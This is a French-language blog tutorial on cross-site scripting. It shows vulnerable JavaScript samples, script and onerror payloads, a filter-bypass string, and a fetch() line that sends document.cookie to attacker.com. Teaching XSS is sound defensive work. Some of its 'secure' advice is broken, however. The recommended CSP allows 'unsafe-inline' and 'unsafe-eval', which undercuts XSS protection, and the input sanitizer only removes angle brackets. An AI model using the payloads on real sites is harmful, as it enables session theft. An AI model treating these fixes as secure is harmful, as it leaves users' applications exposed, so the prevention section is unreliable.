---
layout: post
title: "Vulnérabilités XSS : Comprendre et Prévenir"
date: 2024-03-26
image: /assets/images/posts/xss-security.jpg
tags: [web security, xss, javascript]
excerpt: "Une analyse approfondie des vulnérabilités XSS, leurs types, et les meilleures pratiques pour les prévenir."
---

Les vulnérabilités XSS (Cross-Site Scripting) restent l'une des menaces les plus courantes pour les applications web. Dans cet article, nous explorons en détail ce type de vulnérabilité.

## Types de XSS

### 1. XSS Réfléchi (Reflected)
```javascript
// Exemple vulnérable
const search = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = `Résultats pour: ${search}`;
```

### 2. XSS Stocké (Stored)
```javascript
// Exemple vulnérable
function addComment(comment) {
    const comments = document.getElementById('comments');
    comments.innerHTML += `<div class="comment">${comment}</div>`;
}
```

### 3. XSS DOM-based
```javascript
// Exemple vulnérable
const hash = window.location.hash.substring(1);
document.write(hash);
```

## Techniques d'exploitation

### 1. Injection de script
```html
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
```

### 2. Bypass de filtres
```javascript
// Bypass de filter
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```

### 3. Exfiltration de données
```javascript
fetch('https://attacker.com/steal?cookie=' + document.cookie);
```

## Prévention

### 1. Encodage approprié
```javascript
// Solution sécurisée
function escapeHTML(str) {
    return str.replace(/[&<>'"]/g, 
        tag => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            "'": '&#39;',
            '"': '&quot;'
        }[tag]));
}
```

### 2. Content Security Policy (CSP)
```html
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
```

### 3. Validation des entrées
```javascript
// Solution sécurisée
function sanitizeInput(input) {
    return input.replace(/[<>]/g, '');
}
```

## Bonnes pratiques

1. **Validation côté serveur**
   - Valider toutes les entrées
   - Utiliser des whitelists
   - Sanitizer les données

2. **Sécurité des cookies**
   - Utiliser HttpOnly
   - Activer Secure
   - Configurer SameSite

3. **Monitoring**
   - Détection des tentatives XSS
   - Logging des activités suspectes
   - Alertes en temps réel

## Outils de test

- Burp Suite
- OWASP ZAP
- XSS Hunter
- BeEF Framework

## Conclusion

La prévention des vulnérabilités XSS nécessite une approche multi-couches combinant validation, encodage et politiques de sécurité appropriées.

---

*Prochain article : Protection avancée contre les attaques XSS* 